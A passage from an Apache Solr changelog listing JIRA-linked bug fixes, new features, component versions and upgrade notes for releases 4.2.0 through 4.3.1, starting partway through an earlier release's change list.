     (TomÃ¡s FernÃ¡ndez LÃ¶bbe via Robert Muir)
  3. [SOLR-4738](http://issues.apache.org/jira/browse/SOLR-4738): Update Jetty to 8.1.10.v20130312

     (Mark Miller, Robert Muir)
  4. [SOLR-4749](http://issues.apache.org/jira/browse/SOLR-4749): Clean up and refactor CoreContainer code around solr.xml and SolrCore
     management.

     (Mark Miller)
  5. [SOLR-4547](http://issues.apache.org/jira/browse/SOLR-4547): Move logging of filenames on commit from INFO to DEBUG.

     (Shawn Heisey, hossman)
  6. [SOLR-4757](http://issues.apache.org/jira/browse/SOLR-4757): Change the example to use the new solr.xml format and core
     discovery by directory structure.

     (Mark Miller)
  7. [SOLR-4759](http://issues.apache.org/jira/browse/SOLR-4759): Velocity (/browse) template cosmetic cleanup.

     (Mark Bennett, ehatcher)
  8. [SOLR-4778](http://issues.apache.org/jira/browse/SOLR-4778): LogWatcher init code moved out of CoreContainer

     (Alan Woodward)
  9. [SOLR-4784](http://issues.apache.org/jira/browse/SOLR-4784): Make class LuceneQParser public

     (janhoy)
  10. [SOLR-4448](http://issues.apache.org/jira/browse/SOLR-4448): Allow the solr internal load balancer to be more easily pluggable.

      (Philip Hoy via Robert Muir)
  11. [SOLR-4224](http://issues.apache.org/jira/browse/SOLR-4224): Refactor JavaBinCodec input stream definition to enhance reuse.

      (phunt via Mark Miller)
  12. [SOLR-4931](http://issues.apache.org/jira/browse/SOLR-4931): SolrDeletionPolicy onInit and onCommit methods changed to override
      exact signatures (with generics) from IndexDeletionPolicy

      (shalin)
  13. [SOLR-4942](http://issues.apache.org/jira/browse/SOLR-4942): test improvements to randomize use of compound files

      (hosman)
  14. [SOLR-4966](http://issues.apache.org/jira/browse/SOLR-4966): CSS, JS and other files in webapp without license

      (uschindler,
      steffkes)
  15. [SOLR-4986](http://issues.apache.org/jira/browse/SOLR-4986): Upgrade to Tika 1.4

      (Markus Jelsma via janhoy)
  16. [SOLR-4948](http://issues.apache.org/jira/browse/SOLR-4948), [SOLR-5009](http://issues.apache.org/jira/browse/SOLR-5009): Tidied up CoreContainer construction logic.

      (Alan Woodward, Uwe Schindler, Steve Rowe)
  17. [LUCENE-5107](http://issues.apache.org/jira/browse/LUCENE-5107): Properties files by Solr are now written in UTF-8 encoding,
      Unicode is no longer escaped. Reading of legacy properties files with
      \u escapes is still possible.

      (Uwe Schindler, Robert Muir)

### Release 4.3.1 [2013-06-18]

+ Versions of Major Components   (5)
  1. Apache Tika 1.3
  2. Carrot2 3.6.2
  3. Velocity 1.7 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.4.5
#### Detailed Change List

+ Bug Fixes   (22)
  1. [SOLR-4795](http://issues.apache.org/jira/browse/SOLR-4795): Sub shard leader should not accept any updates from parent after
     it goes active

     (shalin)
  2. [SOLR-4798](http://issues.apache.org/jira/browse/SOLR-4798): shard splitting does not respect the router for the collection
     when executing the index split. One effect of this is that documents
     may be placed in the wrong shard when the default compositeId router
     is used in conjunction with IDs containing "!".

     (yonik)
  3. [SOLR-4797](http://issues.apache.org/jira/browse/SOLR-4797): Shard splitting creates sub shards which have the wrong hash
     range in cluster state. This happens when numShards is not a power of two
     and router is compositeId.

     (shalin)
  4. [SOLR-4806](http://issues.apache.org/jira/browse/SOLR-4806): Shard splitting does not abort if WaitForState times out

     (shalin)
  5. [SOLR-4807](http://issues.apache.org/jira/browse/SOLR-4807): The zkcli script now works with log4j. The zkcli.bat script
     was broken on Windows in 4.3.0, now it works.

     (Shawn Heisey)
  6. [SOLR-4813](http://issues.apache.org/jira/browse/SOLR-4813): Fix SynonymFilterFactory to allow init parameters for
     tokenizer factory used when parsing synonyms file.

     (Shingo Sasaki, hossman)
  7. [SOLR-4829](http://issues.apache.org/jira/browse/SOLR-4829): Fix transaction log leaks (a failure to clean up some old logs)
     on a shard leader, or when unexpected exceptions are thrown during log
     recovery.

     (Steven Bower, Mark Miller, yonik)
  8. [SOLR-4751](http://issues.apache.org/jira/browse/SOLR-4751): Fix replication problem of files in sub directory of conf directory.

     (Minoru Osuka via Koji)
  9. [SOLR-4741](http://issues.apache.org/jira/browse/SOLR-4741): Deleting a collection should set DELETE\_DATA\_DIR to true.

     (Mark Miller)
  10. [SOLR-4752](http://issues.apache.org/jira/browse/SOLR-4752): There are some minor bugs in the Collections API parameter
      validation.

      (Mark Miller)
  11. [SOLR-4563](http://issues.apache.org/jira/browse/SOLR-4563): RSS DIH-example not working

      (janhoy)
  12. [SOLR-4796](http://issues.apache.org/jira/browse/SOLR-4796): zkcli.sh should honor JAVA\_HOME

      (Roman Shaposhnik via Mark Miller)
  13. [SOLR-4734](http://issues.apache.org/jira/browse/SOLR-4734): Leader election fails with an NPE if there is no UpdateLog.

      (Mark Miller, Alexander Eibner)
  14. [SOLR-4868](http://issues.apache.org/jira/browse/SOLR-4868): Setting the log level for the log4j root category results in
      adding a new category, the empty string.

      (Shawn Heisey)
  15. [SOLR-4855](http://issues.apache.org/jira/browse/SOLR-4855): DistributedUpdateProcessor doesn't check for peer sync requests

      (shalin)
  16. [SOLR-4867](http://issues.apache.org/jira/browse/SOLR-4867): Admin UI - setting loglevel on root throws RangeError

      (steffkes)
  17. [SOLR-4870](http://issues.apache.org/jira/browse/SOLR-4870): RecentUpdates.update() does not increment numUpdates loop counter

      (Alexey Kudinov via shalin)
  18. [SOLR-4877](http://issues.apache.org/jira/browse/SOLR-4877), [LUCENE-5023](http://issues.apache.org/jira/browse/LUCENE-5023): Removed SolrIndexSearcher#getDocSetNC()'s special
      case for handling TermQuery to prevent NullPointerException if reader does
      not have fields.

      (Bao Yang Yang, Uwe Schindler)
  19. [SOLR-4881](http://issues.apache.org/jira/browse/SOLR-4881): Fix DocumentAnalysisRequestHandler to correctly use
      EmptyEntityResolver to prevent loading of external entities like
      UpdateRequestHandler does.

      (Hossman, Uwe Schindler)
  20. [SOLR-4858](http://issues.apache.org/jira/browse/SOLR-4858): SolrCore reloading was broken when the UpdateLog
      was enabled.

      (Hossman, Anshum Gupta, Alexey Serba, Mark Miller, yonik)
  21. [SOLR-4853](http://issues.apache.org/jira/browse/SOLR-4853): Fixed SolrJettyTestBase so it may be reused by end users

      (hossman)
  22. [SOLR-4744](http://issues.apache.org/jira/browse/SOLR-4744): Update failure on sub shard is not propagated to clients by parent
      shard

      (Anshum Gupta, yonik, shalin)
+ Other Changes   (1)
  1. [SOLR-4760](http://issues.apache.org/jira/browse/SOLR-4760): Include core name in logs when loading schema.

     (Shawn Heisey)

### Release 4.3.0 [2013-05-05]

+ Versions of Major Components   (5)
  1. Apache Tika 1.3
  2. Carrot2 3.6.2
  3. Velocity 1.7 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.4.5
+ Upgrading from Solr 4.2.0   (3)
  1. In the schema REST API, the output path for copyFields and dynamicFields
     has been changed from all lowercase "copyfields" and "dynamicfields" to
     camelCase "copyFields" and "dynamicFields", respectively, to align with all
     other schema REST API outputs, which use camelCase. The URL format remains
     the same: all resource names are lowercase. See [SOLR-4623](http://issues.apache.org/jira/browse/SOLR-4623) for details.
  2. Slf4j/logging jars are no longer included in the Solr webapp. All logging
     jars are now in example/lib/ext. Changing logging impls is now as easy as
     updating the jars in this folder with those necessary for the logging impl
     you would like. If you are using another webapp container, these jars will
     need to go in the corresponding location for that container.
     In conjunction, the dist-excl-slf4j and dist-war-excl-slf4 build targets
     have been removed since they are redundent. See the Slf4j documentation,
     [SOLR-3706](http://issues.apache.org/jira/browse/SOLR-3706), and [SOLR-4651](http://issues.apache.org/jira/browse/SOLR-4651) for more details.
  3. The hardcoded SolrCloud defaults for 'hostContext="solr"' and
     'hostPort="8983"' have been deprecated and will be removed in Solr 5.0.
     Existing solr.xml files that do not have these options explicitly specified
     should be updated accordingly. See [SOLR-4622](http://issues.apache.org/jira/browse/SOLR-4622) for more details.
#### Detailed Change List

+ New Features   (11)
  1. [SOLR-4648](http://issues.apache.org/jira/browse/SOLR-4648) PreAnalyzedUpdateProcessorFactory allows using the functionality
     of PreAnalyzedField with other field types. See javadoc for details and
     examples.

     (Andrzej Bialecki)
  2. [SOLR-4623](http://issues.apache.org/jira/browse/SOLR-4623): Provide REST API read access to all elements of the live schema.
     Add a REST API request to return the entire live schema, in JSON, XML, and
     schema.xml formats. Move REST API methods from package org.apache.solr.rest
     to org.apache.solr.rest.schema, and rename base functionality REST API
     classes to remove the current schema focus, to prepare for other non-schema
     REST APIs. Change output path for copyFields and dynamicFields from
     "copyfields" and "dynamicfields" (all lowercase) to "copyFields" and
     "dynamicFields", respectively, to align with all other REST API outputs, which
     use camelCase.

     (Steve Rowe)
  3. [SOLR-4658](http://issues.apache.org/jira/browse/SOLR-4658): In preparation for REST API requests that can modify the schema,
     a "managed schema" is introduced.
     Add '<schemaFactory class="ManagedSchemaFactory" mutable="true"/>' to solrconfig.xml
     in order to use it, and to enable schema modifications via REST API requests.

     (Steve Rowe, Robert Muir)
  4. [SOLR-4656](http://issues.apache.org/jira/browse/SOLR-4656): Added two new highlight parameters, hl.maxMultiValuedToMatch and
     hl.maxMultiValuedToExamine. maxMultiValuedToMatch stops looking for snippets after
     finding the specified number of matches, no matter how far into the multivalued field
     you've gone. maxMultiValuedToExamine stops looking for matches after the specified
     number of multiValued entries have been examined. If both are specified, the limit
     hit first stops the loop. Also this patch cuts down on the copying of the document
     entries during highlighting. These optimizations are probably unnoticeable unless
     there are a large number of entries in the multiValued field. Conspicuously, this will
     prevent the "best" match from being found if it appears later in the MV list than the
     cutoff specified by either of these params.

     (Erick Erickson)
  5. [SOLR-4675](http://issues.apache.org/jira/browse/SOLR-4675): Improve PostingsSolrHighlighter to support per-field/query-time overrides
     and add additional configuration parameters. See the javadocs for more details and
     examples.

     (Robert Muir)
  6. [SOLR-3755](http://issues.apache.org/jira/browse/SOLR-3755): A new collections api to add additional shards dynamically by splitting
     existing shards.

     (yonik, Anshum Gupta, shalin)
  7. [SOLR-4530](http://issues.apache.org/jira/browse/SOLR-4530): DIH: Provide configuration to use Tika's IdentityHtmlMapper

     (Alexandre Rafalovitch via shalin)
  8. [SOLR-4662](http://issues.apache.org/jira/browse/SOLR-4662): Discover SolrCores by directory structure rather than defining them
     in solr.xml. Also, change the format of solr.xml to be closer to that of solrconfig.xml.
     This version of Solr will ship the example in the old style, but you can manually
     try the new style. Solr 4.4 will ship with the new style, and Solr 5.0 will remove
     support for the old style.

     (Erick Erickson, Mark Miller)
     Additional Work:
     - [SOLR-4347](http://issues.apache.org/jira/browse/SOLR-4347): Ensure that newly-created cores via Admin handler are persisted in solr.xml
     (Erick Erickson)- [SOLR-1905](http://issues.apache.org/jira/browse/SOLR-1905): Cores created by the admin request handler should be persisted to solr.xml.Also fixed a problem whereby properties like solr.solr.datadir would be persisted
     to solr.xml. Also, cores that didn't happen to be loaded were not persisted.

     (Erick Erickson)
  9. [SOLR-4717](http://issues.apache.org/jira/browse/SOLR-4717)/[SOLR-1351](http://issues.apache.org/jira/browse/SOLR-1351): SimpleFacets now work with localParams allowing faceting on the
     same field multiple ways

     (ryan, Uri Boness)
  10. [SOLR-4671](http://issues.apache.org/jira/browse/SOLR-4671): CSVResponseWriter now supports pseudo fields.

      (ryan, nihed mbarek)
  11. [SOLR-4358](http://issues.apache.org/jira/browse/SOLR-4358): HttpSolrServer sends the stream name and exposes 'useMultiPartPost'

      (Karl Wright via ryan)
+ Bug Fixes   (23)
  1. [SOLR-4543](http://issues.apache.org/jira/browse/SOLR-4543): setting shardHandlerFactory in solr.xml/solr.properties does not work.

     (Ryan Ernst, Robert Muir via Erick Erickson)
  2. [SOLR-4634](http://issues.apache.org/jira/browse/SOLR-4634): Fix scripting engine tests to work with Java 8's "Nashorn" Javascript
     implementation.

     (Uwe Schindler)
  3. [SOLR-4636](http://issues.apache.org/jira/browse/SOLR-4636): If opening a reader fails for some reason when opening a SolrIndexSearcher,
     a Directory can be left unreleased.

     (Mark Miller)
  4. [SOLR-4405](http://issues.apache.org/jira/browse/SOLR-4405): Admin UI - admin-extra files are not rendered into the core-menu

     (steffkes)
  5. [SOLR-3956](http://issues.apache.org/jira/browse/SOLR-3956): Fixed group.facet=true to work with negative facet.limit

     (Chris van der Merwe, hossman)
  6. [SOLR-4650](http://issues.apache.org/jira/browse/SOLR-4650): copyField doesn't work with source globs that don't match any
     explicit or dynamic fields. This regression was introduced in Solr 4.2.

     (Daniel Collins, Steve Rowe)
  7. [SOLR-4641](http://issues.apache.org/jira/browse/SOLR-4641): Schema now throws exception on illegal field parameters.

     (Robert Muir)
  8. [SOLR-3758](http://issues.apache.org/jira/browse/SOLR-3758): Fixed SpellCheckComponent to work consistently with distributed grouping

     (James Dyer)
  9. [SOLR-4652](http://issues.apache.org/jira/browse/SOLR-4652): Fix broken behavior with shared libraries in resource loader for
     solr.xml plugins.

     (Ryan Ernst, Robert Muir, Uwe Schindler)
  10. [SOLR-4664](http://issues.apache.org/jira/browse/SOLR-4664): ZkStateReader should update aliases on construction.

      (Mark Miller, Elodie Sannier)
  11. [SOLR-4682](http://issues.apache.org/jira/browse/SOLR-4682): CoreAdminRequest.mergeIndexes can not merge multiple cores or indexDirs.

      (Jason.D.Cao via shalin)
  12. [SOLR-4581](http://issues.apache.org/jira/browse/SOLR-4581): When faceting on numeric fields in Solr 4.2, negative values (constraints)
      were sorted incorrectly.

      (Alexander Buhr, shalin, yonik)
  13. [SOLR-4699](http://issues.apache.org/jira/browse/SOLR-4699): The System admin handler should not assume a file system based data directory
      location.

      (Mark Miller)
  14. [SOLR-4695](http://issues.apache.org/jira/browse/SOLR-4695): Fix core admin SPLIT action to be useful with non-cloud setups

      (shalin)
  15. [SOLR-4680](http://issues.apache.org/jira/browse/SOLR-4680): Correct example spellcheck configuration's queryAnalyzerFieldType and
      use "text" field instead of narrower "name" field

      (ehatcher, Mark Bennett)
  16. [SOLR-4702](http://issues.apache.org/jira/browse/SOLR-4702): Fix example /browse "Did you mean?" suggestion feature.

      (ehatcher, Mark Bennett)
  17. [SOLR-4710](http://issues.apache.org/jira/browse/SOLR-4710): You cannot delete a collection fully from ZooKeeper unless all nodes are up and
      functioning correctly.

      (Mark Miller)
  18. [SOLR-4487](http://issues.apache.org/jira/browse/SOLR-4487): SolrExceptions thrown by HttpSolrServer will now contain the
      proper HTTP status code returned by the remote server, even if that status
      code is not something Solr itself returned -- eg: from the Servlet Container,
      or an intermediate HTTP Proxy

      (hossman)
  19. [SOLR-4661](http://issues.apache.org/jira/browse/SOLR-4661): Admin UI Replication details now correctly displays the current
      replicable generation/version of the master.

      (hossman)
  20. [SOLR-4716](http://issues.apache.org/jira/browse/SOLR-4716),[SOLR-4584](http://issues.apache.org/jira/browse/SOLR-4584): SolrCloud request proxying does not work on Tomcat and
      perhaps other non Jetty containers.

      (Po Rui, Yago Riveiro via Mark Miller)
  21. [SOLR-4746](http://issues.apache.org/jira/browse/SOLR-4746): Distributed grouping used a NamedList instead of a SimpleOrderedMap
      for the top level group commands, causing output formatting differences
      compared to non-distributed grouping.

      (yonik)
  22. [SOLR-4705](http://issues.apache.org/jira/browse/SOLR-4705): Fixed bug causing NPE when querying a single replica in SolrCloud
      using the shards param

      (Raintung Li, hossman)
  23. [SOLR-4729](http://issues.apache.org/jira/browse/SOLR-4729): LukeRequestHandler: Using a dynamic copyField source that is
      not also a dynamic field triggers error message 'undefined field: "(glob)"'.

      (Adam Hahn, hossman, Steve Rowe)
+ Optimizations   (none)
+ Other Changes   (11)
  1. [SOLR-4653](http://issues.apache.org/jira/browse/SOLR-4653): Solr configuration should log inaccessible/ non-existent relative paths in lib
     dir=...

     (Dawid Weiss)
  2. [SOLR-4317](http://issues.apache.org/jira/browse/SOLR-4317): SolrTestCaseJ4: Can't avoid "collection1" convention

     (Tricia Jenkins, via Erick Erickson)
  3. [SOLR-4571](http://issues.apache.org/jira/browse/SOLR-4571): SolrZkClient#setData should return Stat object.

     (Mark Miller)
  4. [SOLR-4603](http://issues.apache.org/jira/browse/SOLR-4603): CachingDirectoryFactory should use an IdentityHashMap for
     byDirectoryCache.

     (Mark Miller)
  5. [SOLR-4544](http://issues.apache.org/jira/browse/SOLR-4544): Refactor HttpShardHandlerFactory so load-balancing logic can be customized.

     (Ryan Ernst via Robert Muir)
  6. [SOLR-4607](http://issues.apache.org/jira/browse/SOLR-4607): Use noggit 0.5 release jar rather than a forked copy.

     (Yonik Seeley, Robert Muir)
  7. [SOLR-3706](http://issues.apache.org/jira/browse/SOLR-3706): Ship setup to log with log4j.

     (ryan, Mark Miller)
  8. [SOLR-4651](http://issues.apache.org/jira/browse/SOLR-4651): Remove dist-excl-slf4j build target.

     (Shawn Heisey)
  9. [SOLR-4622](http://issues.apache.org/jira/browse/SOLR-4622): The hardcoded SolrCloud defaults for 'hostContext="solr"' and
     'hostPort="8983"' have been deprecated and will be removed in Solr 5.0.
     Existing solr.xml files that do not have these options explicitly specified
     should be updated accordingly.

     (hossman)
  10. [SOLR-4672](http://issues.apache.org/jira/browse/SOLR-4672): Requests attempting to use SolrCores which had init failures
      (that would be reported by CoreAdmin STATUS requests) now result in 500
      error responses with the details about the init failure, instead of 404
      error responses.

      (hossman)
  11. [SOLR-4730](http://issues.apache.org/jira/browse/SOLR-4730): Make the wiki link more prominent in the release documentation.

      (Uri Laserson via Robert Muir)

### Release 4.2.1 [2013-04-03]

+ Versions of Major Components   (5)
  1. Apache Tika 1.3
  2. Carrot2 3.6.2
  3. Velocity 1.7 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.4.5
#### Detailed Change List

+ Bug Fixes   (38)
  1. [SOLR-4567](http://issues.apache.org/jira/browse/SOLR-4567): copyField source glob matching explicit field(s) stopped working
     in Solr 4.2.

     (Alexandre Rafalovitch, Steve Rowe)
  2. [SOLR-4475](http://issues.apache.org/jira/browse/SOLR-4475): Fix various places that still assume File based paths even when
     not using a file based DirectoryFactory.

     (Mark Miller)
  3. [SOLR-4551](http://issues.apache.org/jira/browse/SOLR-4551): CachingDirectoryFactory needs to create CacheEntry's with the
     fullpath not path.

     (Mark Miller)
  4. [SOLR-4555](http://issues.apache.org/jira/browse/SOLR-4555): When forceNew is used with CachingDirectoryFactory#get, the old
     CachValue should give up it's path as it will be used by a new Directory
     instance.

     (Mark Miller)
  5. [SOLR-4578](http://issues.apache.org/jira/browse/SOLR-4578): CoreAdminHandler#handleCreateAction gets a SolrCore and does not
     close it in SolrCloud mode when a core with the same name already exists.

     (Mark Miller)
  6. [SOLR-4574](http://issues.apache.org/jira/browse/SOLR-4574): The Collections API will silently return success on an unknown
     ACTION parameter.

     (Mark Miller)
  7. [SOLR-4576](http://issues.apache.org/jira/browse/SOLR-4576): Collections API validation errors should cause an exception on
     clients and otherwise act as validation errors with the Core Admin API.

     (Mark Miller)
  8. [SOLR-4577](http://issues.apache.org/jira/browse/SOLR-4577): The collections API should return responses (success or failure)
     for each node it attempts to work with.

     (Mark Miller)
  9. [SOLR-4568](http://issues.apache.org/jira/browse/SOLR-4568): The lastPublished state check before becoming a leader is not
     working correctly.

     (Mark Miller)
  10. [SOLR-4570](http://issues.apache.org/jira/browse/SOLR-4570): Even if an explicit shard id is used, ZkController#preRegister
      should still wait to see the shard id in it's current ClusterState.

      (Mark Miller)
  11. [SOLR-4585](http://issues.apache.org/jira/browse/SOLR-4585): The Collections API validates numShards with < 0 but should use
      <= 0.

      (Mark Miller)
  12. [SOLR-4592](http://issues.apache.org/jira/browse/SOLR-4592): DefaultSolrCoreState#doRecovery needs to check the CoreContainer
      shutdown flag inside the recoveryLock sync block.

      (Mark Miller)
  13. [SOLR-4595](http://issues.apache.org/jira/browse/SOLR-4595): CachingDirectoryFactory#close can throw a concurrent
      modification exception.

      (Mark Miller)
  14. [SOLR-4573](http://issues.apache.org/jira/browse/SOLR-4573): Accessing Admin UI files in SolrCloud mode logs warnings.

      (Mark Miller, Phil John)
  15. [SOLR-4594](http://issues.apache.org/jira/browse/SOLR-4594): StandardDirectoryFactory#remove accesses byDirectoryCache
      without a lock.

      (Mark Miller)
  16. [SOLR-4597](http://issues.apache.org/jira/browse/SOLR-4597): CachingDirectoryFactory#remove should not attempt to empty/remove
      the index right away but flag for removal after close.

      (Mark Miller)
  17. [SOLR-4598](http://issues.apache.org/jira/browse/SOLR-4598): The Core Admin unload command's option 'deleteDataDir', should use
      the DirectoryFactory API to remove the data dir.

      (Mark Miller)
  18. [SOLR-4599](http://issues.apache.org/jira/browse/SOLR-4599): CachingDirectoryFactory calls close(Directory) on forceNew if the
      Directory has a refCnt of 0, but it should call closeDirectory(CacheValue).

      (Mark Miller)
  19. [SOLR-4602](http://issues.apache.org/jira/browse/SOLR-4602): ZkController#unregister should cancel it's election participation
      before asking the Overseer to delete the SolrCore information.

      (Mark Miller)
  20. [SOLR-4601](http://issues.apache.org/jira/browse/SOLR-4601): A Collection that is only partially created and then deleted will
      leave pre allocated shard information in ZooKeeper.

      (Mark Miller)
  21. [SOLR-4604](http://issues.apache.org/jira/browse/SOLR-4604): UpdateLog#init is over called on SolrCore#reload.

      (Mark Miller)
  22. [SOLR-4605](http://issues.apache.org/jira/browse/SOLR-4605): Rollback does not work correctly.

      (Mark S, Mark Miller)
  23. [SOLR-4609](http://issues.apache.org/jira/browse/SOLR-4609): The Collections API should only send the reload command to ACTIVE
      cores.

      (Mark Miller)
  24. [SOLR-4297](http://issues.apache.org/jira/browse/SOLR-4297): Atomic update request containing null=true sets all subsequent
      fields to null

      (Ben Pennell, Rob, shalin)
  25. [SOLR-4371](http://issues.apache.org/jira/browse/SOLR-4371): Admin UI - Analysis Screen shows empty result

      (steffkes)
  26. [SOLR-4318](http://issues.apache.org/jira/browse/SOLR-4318): NPE encountered with querying with wildcards on a field that uses
      the DefaultAnalyzer (i.e. no analysis chain defined).

      (Erick Erickson)
  27. [SOLR-4361](http://issues.apache.org/jira/browse/SOLR-4361): DataImportHandler would throw UnsupportedOperationException if
      handler-level parameters were specified containing periods in the name

      (James Dyer)
  28. [SOLR-4538](http://issues.apache.org/jira/browse/SOLR-4538): Date Math expressions were being truncated to 32 characters
      when used in field:value queries in the lucene QParser.

      (hossman, yonik)
  29. [SOLR-4617](http://issues.apache.org/jira/browse/SOLR-4617): SolrCore#reload needs to pass the deletion policy to the next
      SolrCore through it's constructor rather than setting a field after.

      (Mark Miller)
  30. [SOLR-4589](http://issues.apache.org/jira/browse/SOLR-4589): Fixed CPU spikes and poor performance in lazy field loading
      of multivalued fields.

      (hossman)
  31. [SOLR-4608](http://issues.apache.org/jira/browse/SOLR-4608): Update Log replay and PeerSync replay should use the default
      processor chain to update the index.

      (Ludovic Boutros, yonik)
  32. [SOLR-4625](http://issues.apache.org/jira/browse/SOLR-4625): The solr (lucene syntax) query parser lost top-level boost
      values and top-level phrase slops on queries produced by nested
      sub-parsers.

      (yonik)
  33. [SOLR-4624](http://issues.apache.org/jira/browse/SOLR-4624): CachingDirectoryFactory does not need to support forceNew any
      longer and it appears to be causing a missing close directory bug. forceNew
      is no longer respected and will be removed in 4.3.

      (Mark Miller)
  34. [SOLR-3819](http://issues.apache.org/jira/browse/SOLR-3819): Grouped faceting (group.facet=true) did not respect filter
      exclusions.

      (Petter Remen, yonik)
  35. [SOLR-4637](http://issues.apache.org/jira/browse/SOLR-4637): Replication can sometimes wait until shutdown or core unload until
      removing some tmp directories.

      (Mark Miller)
  36. [SOLR-4638](http://issues.apache.org/jira/browse/SOLR-4638): DefaultSolrCoreState#getIndexWriter(null) is a way to avoid
      creating the IndexWriter earlier than necessary, but it's not
      implemented quite right.

      (Mark Miller)
  37. [SOLR-4640](http://issues.apache.org/jira/browse/SOLR-4640): CachingDirectoryFactory can fail to close directories in some race
      conditions.

      (Mark Miller)
  38. [SOLR-4642](http://issues.apache.org/jira/browse/SOLR-4642): QueryResultKey is not calculating the correct hashCode for filters.

      (Joel Bernstein via Mark Miller)
+ Optimizations   (2)
  1. [SOLR-4569](http://issues.apache.org/jira/browse/SOLR-4569): waitForReplicasToComeUp should bail right away if it doesn't see the
     expected slice in the clusterstate rather than waiting.

     (Mark Miller)
  2. [SOLR-4311](http://issues.apache.org/jira/browse/SOLR-4311): Admin UI - Optimize Caching Behaviour

     (steffkes)
+ Other Changes   (2)
  1. [SOLR-4537](http://issues.apache.org/jira/browse/SOLR-4537): Clean up schema information REST API.

     (Steve Rowe)
  2. [SOLR-4596](http://issues.apache.org/jira/browse/SOLR-4596): DistributedQueue should ensure its full path exists in the constructor.

     (Mark Miller)

### Release 4.2.0 [2013-03-11]

+ Versions of Major Components   (5)
  1. Apache Tika 1.3
  2. Carrot2 3.6.2
  3. Velocity 1.7 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.4.5
+ Upgrading from Solr 4.1.0   (1)
  1. (No upgrade instructions yet)
#### Detailed Change List

+ New Features   (15)
  1. [SOLR-4043](http://issues.apache.org/jira/browse/SOLR-4043): Add ability to get success/failure responses from Collections API.

     (Raintung Li, Mark Miller)
  2. [SOLR-2827](http://issues.apache.org/jira/browse/SOLR-2827): RegexpBoost Update Processor

     (janhoy)
  3. [SOLR-4370](http://issues.apache.org/jira/browse/SOLR-4370): Allow configuring commitWithin to do hard commits.

     (Mark Miller, Senthuran Sivananthan)
  4. [SOLR-4451](http://issues.apache.org/jira/browse/SOLR-4451): SolrJ, and SolrCloud internals, now use SystemDefaultHttpClient
     under the covers -- allowing many HTTP connection related properties to be
     controlled via 'standard' java system properties.

     (hossman)
  5. [SOLR-3855](http://issues.apache.org/jira/browse/SOLR-3855), [SOLR-4490](http://issues.apache.org/jira/browse/SOLR-4490): Doc values support.

     (Adrien Grand, Robert Muir)
  6. [SOLR-4417](http://issues.apache.org/jira/browse/SOLR-4417): Reopen the IndexWriter on SolrCore reload.

     (Mark Miller)
  7. [SOLR-4477](http://issues.apache.org/jira/browse/SOLR-4477): Add support for queries (match-only) against docvalues fields.

     (Robert Muir)
  8. [SOLR-4488](http://issues.apache.org/jira/browse/SOLR-4488): Return slave replication details for a master if the master has
     also acted like a slave.

     (Mark Miller)
  9. [SOLR-4498](http://issues.apache.org/jira/browse/SOLR-4498): Add list command to ZkCLI that prints out the contents of
     ZooKeeper.

     (Roman Shaposhnik via Mark Miller)
  10. [SOLR-4481](http://issues.apache.org/jira/browse/SOLR-4481): SwitchQParserPlugin registered by default as 'switch' using
      syntax: {!switch case=XXX case.foo=YYY case.bar=ZZZ default=QQQ}foo

      (hossman)
  11. [SOLR-4078](http://issues.apache.org/jira/browse/SOLR-4078): Allow custom naming of SolrCloud nodes so that a new host:port
      combination can take over for a previous shard.

      (Mark Miller)
  12. [SOLR-4210](http://issues.apache.org/jira/browse/SOLR-4210): Requests to a Collection that does not exist on the receiving node
      should be proxied to a suitable node.

      (Mark Miller, Po Rui, yonik)
  13. [SOLR-1365](http://issues.apache.org/jira/browse/SOLR-1365): New SweetSpotSimilarityFactory allows customizable TF/IDF based
      Similarity when you know the optimal "Sweet Spot" of values for the field
      length and TF scoring factors.

      (hossman)
  14. [SOLR-4138](http://issues.apache.org/jira/browse/SOLR-4138): CurrencyField fields can now be used in a ValueSources to
      get the "raw" value (using the default number of fractional digits) in
      the default currency of the field type. There is also a new
      currency(field,[CODE]) function for generating a ValueSource of the
      "natural" value, converted to an optionally specified currency to
      override the default for the field type.

      (hossman)
  15. [SOLR-4503](http://issues.apache.org/jira/browse/SOLR-4503): Add REST API methods, via Restlet integration, for reading schema
      elements, at /schema/fields/, /schema/dynamicfields/, /schema/fieldtypes/,
      and /schema/copyfields/.

      (Steve Rowe)
+ Bug Fixes   (34)
  1. [SOLR-2850](http://issues.apache.org/jira/browse/SOLR-2850): Do not refine facets when minCount == 1

     (Matt Smith, lundgren via Adrien Grand)
  2. [SOLR-4309](http://issues.apache.org/jira/browse/SOLR-4309): /browse: Improve JQuery autosuggest behavior

     (janhoy)
  3. [SOLR-4330](http://issues.apache.org/jira/browse/SOLR-4330): group.sort is ignored when using group.truncate and ex/tag
     local params together

     (koji)
  4. [SOLR-4321](http://issues.apache.org/jira/browse/SOLR-4321): Collections API will sometimes use a node more than once, even
     when more unused nodes are available.

     (Eric Falcao, Brett Hoerner, Mark Miller)
  5. [SOLR-4345](http://issues.apache.org/jira/browse/SOLR-4345) : Solr Admin UI dosent work in IE 10

     (steffkes)
  6. [SOLR-4349](http://issues.apache.org/jira/browse/SOLR-4349) : Admin UI - Query Interface does not work in IE

     (steffkes)
  7. [SOLR-4359](http://issues.apache.org/jira/browse/SOLR-4359): The RecentUpdates#update method should treat a problem reading the
     next record the same as a problem parsing the record - log the exception and
     break.

     (Mark Miller)
  8. [SOLR-4225](http://issues.apache.org/jira/browse/SOLR-4225): Term info page under schema browser shows incorrect count of terms

     (steffkes)
  9. [SOLR-3926](http://issues.apache.org/jira/browse/SOLR-3926): Solr should support better way of finding active sorts

     (Eirik Lygre via
     Erick Erickson)
  10. [SOLR-4342](http://issues.apache.org/jira/browse/SOLR-4342): Fix DataImportHandler stats to be a proper Map

      (hossman)
  11. [SOLR-3967](http://issues.apache.org/jira/browse/SOLR-3967): langid.enforceSchema option checks source field instead of target field

      (janhoy)
  12. [SOLR-4380](http://issues.apache.org/jira/browse/SOLR-4380): Replicate after startup option would not replicate until the
      IndexWriter was lazily opened.

      (Mark Miller, Gregg Donovan)
  13. [SOLR-4400](http://issues.apache.org/jira/browse/SOLR-4400): Deadlock can occur in a rare race between committing and
      closing a SolrIndexWriter.

      (Erick Erickson, Mark Miller)
  14. [SOLR-3655](http://issues.apache.org/jira/browse/SOLR-3655): A restarted node can briefly appear live and active before it really
      is in some cases.

      (Mark Miller)
